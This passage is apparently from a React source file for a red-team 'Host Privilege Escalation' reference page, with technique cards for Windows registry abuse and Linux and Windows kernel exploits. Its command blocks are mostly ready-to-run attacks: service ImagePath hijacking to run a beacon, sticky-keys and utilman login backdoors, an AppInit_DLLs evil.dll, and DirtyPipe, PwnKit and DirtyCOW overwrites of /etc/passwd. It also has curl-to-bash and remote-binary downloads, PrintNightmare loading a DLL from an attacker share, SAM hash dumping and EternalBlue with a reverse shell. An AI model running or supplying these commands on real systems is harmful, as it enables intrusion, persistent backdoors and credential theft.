        code: `# --- SERVICE REGISTRY KEY PERMISSIONS ---
# Check all service keys for write access
execute-assembly /tools/accesschk.exe -wk "Authenticated Users" HKLM\\SYSTEM\\CurrentControlSet\\Services
execute-assembly /tools/accesschk.exe -wk "Everyone" HKLM\\SYSTEM\\CurrentControlSet\\Services
# Or PowerShell:
$services = Get-ChildItem "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
foreach ($svc in $services) {
    $acl = Get-Acl $svc.PSPath
    $acl.Access | Where-Object {
        $_.IdentityReference -match "Authenticated Users|Everyone|BUILTIN\\\\Users" -and
        $_.RegistryRights -match "FullControl|WriteKey|SetValue"
    } | ForEach-Object { Write-Host "Writable: $($svc.Name) by $($_.IdentityReference)" }
}

# If writable service key found — modify ImagePath
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VulnSvc" /v "ImagePath" /t REG_EXPAND_SZ /d "C:\\Windows\\Temp\\beacon.exe" /f
sc stop VulnSvc; sc start VulnSvc   # Or reboot

# --- IFEO DEBUGGER BACKDOOR (login screen backdoor) ---
# Requires admin to set — but read-it-then-exploit if already elevated
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f
# Now: at Windows login screen, press Shift 5 times → SYSTEM cmd.exe

# Or utilman.exe (Win+U at login screen)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f

# Cleanup:
reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /f

# --- APPINIT_DLLS ---
# Check current value and permissions
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs
reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs
# If writable (rare but seen in older systems):
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\\Windows\\Temp\\evil.dll" /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f

# --- POWERUP AUTOMATED CHECKS ---
execute-assembly /tools/PowerUp.exe
# Covers: AlwaysInstallElevated, service registry, autorun HKLM, modifiable paths`
      }
    ]
  },
  {
    id: 'linux-kernel',
    title: 'Linux Kernel Exploits',
    subtitle: 'Exploit unpatched kernel vulnerabilities for local privilege escalation to root',
    tags: ['DirtyPipe', 'DirtyCOW', 'nf_tables', 'CVE-2022-0847', 'CVE-2021-4034', 'pkexec'],
    accentColor: 'yellow',
    overview: 'Linux kernel exploits provide direct root escalation from any unprivileged user. DirtyPipe (CVE-2022-0847) allows overwriting read-only files including /etc/passwd on kernels 5.8–5.16.11. PwnKit (CVE-2021-4034) affects pkexec on all distributions with polkit installed and provides instant root. linux-exploit-suggester automates CVE matching by comparing the running kernel version against a database of known exploits.',
    steps: [
      'Always check kernel version first — many kernels are years behind on patches',
      'CVE-2022-0847 (DirtyPipe): Linux 5.8+ — overwrite read-only files including /etc/passwd',
      'CVE-2021-4034 (PwnKit): polkit pkexec — affects all major distros, easy exploit',
      'CVE-2021-22555: netfilter heap overflow — LPE from unprivileged user',
      'CVE-2016-5195 (DirtyCOW): race condition in copy-on-write — write to read-only mapped memory',
      'Use linux-exploit-suggester to automate kernel CVE matching based on uname output',
    ],
    commands: [
      {
        title: 'Kernel exploit identification and exploitation',
        code: `# Identify kernel version
uname -r
cat /proc/version

# linux-exploit-suggester (automated matching)
curl -s https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

# CVE-2022-0847 — DirtyPipe (kernel 5.8 – 5.16.11)
# Overwrites read-only files — easiest: overwrite /etc/passwd root entry
# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
gcc exploit.c -o dirtypipe && ./dirtypipe /etc/passwd 1 'root::0:0:root:/root:/bin/bash'
su root   # now no password for root

# CVE-2021-4034 — PwnKit (polkit pkexec)
# Works on all Linux distros with polkit installed
# PoC: https://github.com/ly4k/PwnKit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit   # Instant root shell

# CVE-2016-5195 — DirtyCOW (kernel < 4.8.3)
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow /etc/passwd 'root:DIRTYCOW:0:0:root:/root:/bin/bash'
su root -p DIRTYCOW

# Check for vulnerable polkit version
pkexec --version
dpkg -l policykit-1
rpm -qa polkit

# searchsploit for kernel version
searchsploit linux kernel $(uname -r | cut -d. -f1,2)
searchsploit ubuntu $(lsb_release -r | awk '{print $2}')`
      }
    ]
  },
  {
    id: 'win-kernel',
    title: 'Windows Kernel Exploits',
    subtitle: 'Exploit unpatched Windows kernel vulnerabilities for local privilege escalation to SYSTEM',
    tags: ['PrintNightmare', 'EternalBlue', 'MS17-010', 'CVE-2021-34527', 'HiveNightmare', 'KernelBase'],
    accentColor: 'yellow',
    overview: 'Windows kernel exploits escalate from any user to SYSTEM. PrintNightmare (CVE-2021-34527) exploits the Windows Print Spooler service — a driver DLL is loaded as SYSTEM, providing instant privilege escalation on any unpatched Windows server. HiveNightmare allows reading the SAM hive as a non-admin user, enabling local credential extraction without SYSTEM. WinPEAS automates comprehensive privilege escalation checks across services, registry keys, scheduled tasks, and installed patches.',
    steps: [
      'Check Windows version, build, and patch level — use systeminfo or WinPEAS',
      'PrintNightmare (CVE-2021-34527): Windows Print Spooler — LPE from standard user to SYSTEM',
      'HiveNightmare (CVE-2021-36934): read SAM/SYSTEM hives as non-admin — dump local hashes',
      'EternalBlue (MS17-010): SMB remote code execution — still present in unpatched legacy systems',
      'WinPEAS: automated Windows privesc suggester — checks patches, services, paths, registry',
      'Use Windows-Exploit-Suggester-NG to cross-reference systeminfo output against known CVEs',
    ],
    commands: [
      {
        title: 'Windows kernel exploit identification',
        code: `# Check OS version and patch level
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

# WinPEAS — automated privesc checker
execute-assembly /path/to/WinPEAS.exe

# Windows-Exploit-Suggester
# Collect systeminfo output, run on attacker:
python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo sysinfo.txt

# CVE-2021-34527 — PrintNightmare (LPE)
# Check if Spooler is running:
sc query Spooler
# PoC: https://github.com/cube0x0/CVE-2021-34527
python3 CVE-2021-34527.py CORP/user:Pass@TARGET '\\\\ATTACKER\\share\\beacon.dll'

# CVE-2021-36934 — HiveNightmare / SeriousSAM
# Check if shadow copies are accessible:
icacls C:\\Windows\\System32\\config\\SAM
# If readable by BUILTIN\\Users:
reg save HKLM\\SAM C:\\Temp\\sam.hiv   # or directly read shadow copy
vssadmin list shadows
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

# MS17-010 — EternalBlue (SMB RCE, unpatched legacy)
# Check if vulnerable:
nmap -p 445 --script smb-vuln-ms17-010 TARGET
# Exploit via Metasploit:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run`
      }
    ]
  },
];

export default function PrivilegeEscalation() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Host Privilege </span><span className="text-red-400">Escalation</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Services • UAC Bypass • Token Manipulation • DPAPI</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {[
          techniques.find(t => t.id === 'services'),
          techniques.find(t => t.id === 'uac'),
          techniques.find(t => t.id === 'named-pipe'),
          ...macOSPrivesc,
          techniques.find(t => t.id === 'tokens'),
          techniques.find(t => t.id === 'dpapi'),
          techniques.find(t => t.id === 'always-install'),
          ...linuxPrivesc,
          techniques.find(t => t.id === 'reg-privesc'),
        ].filter(Boolean).map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}